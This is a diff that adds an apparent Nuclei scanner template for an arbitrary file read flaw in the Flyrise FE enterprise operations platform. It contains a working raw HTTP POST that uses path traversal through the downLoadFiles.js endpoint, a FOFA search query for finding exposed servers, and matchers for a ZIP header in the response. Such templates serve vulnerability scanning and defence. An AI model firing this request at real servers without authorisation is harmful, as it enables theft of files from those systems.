@@ -1,0 +1,32 @@
+id: flyrise-downLoadFiles-fileread
+
+info:
+  name: 飞企互联 FE 企业运营管理平台 downLoadFiles.js - fileread
+  author: leadlife
+  severity: high
+  description: 飞企互联FE业务协作平台 /system/mediafile/downLoadFiles.js 任意文件读取漏洞
+  metadata:
+    verified: true
+    fofa-qeury: app="飞企互联-FE企业运营管理平台"
+  tags: flyrise,fileread
+
+http:
+  - raw:
+      - |
+        POST /system/mediafile/downLoadFiles.js%70 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 60
+
+        path=../../jboss/web/fe.war/UserUploadFile&msVal=2222222222,
+
+    matchers-condition: and
+    matchers:
+      - type: binary
+        part: body
+        binary:
+          - 504b0304140008000800
+
+      - type: status
+        status:
+          - 200
